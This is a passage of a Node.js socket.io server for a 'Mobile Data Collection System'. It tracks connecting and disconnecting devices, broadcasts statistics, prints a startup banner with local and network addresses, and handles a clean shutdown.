    io.emit('dataUpdate', { type: data.type, deviceId, stats: dataStats });
  });
  
  socket.on('disconnect', () => {
    const device = Array.from(devices.values()).find(d => d.id === socket.id);
    if (device) {
      devices.delete(socket.id);
      dataStats.deviceCount = devices.size;
      log.device(`Device disconnected: ${device.name}`);
      io.emit('deviceDisconnect', device);
    }
  });
});

// Baslat server
const PORT = process.env.PORT || 8080;

server.listen(PORT, () => {
  console.clear();
  console.log(chalk.cyan(`
========================================
    Mobile Data Collection System
    Secure Development Platform
========================================
`));
  console.log(chalk.green(`Server running on:`));
  console.log(chalk.white(`  Local:    http://localhost:${PORT}`));
  console.log(chalk.white(`  Network:  http://${LOCAL_IP}:${PORT}`));
  console.log(chalk.yellow(`\nAccess the web panel to monitor devices`));
  console.log(chalk.blue(`\nWaiting for device connections...`));
});

// Graceful shutdown
process.on('SIGINT', () => {
  log.info('Shutting down server...');
  server.close(() => {
    log.success('Server shutdown complete');
    process.exit(0);
  });
});
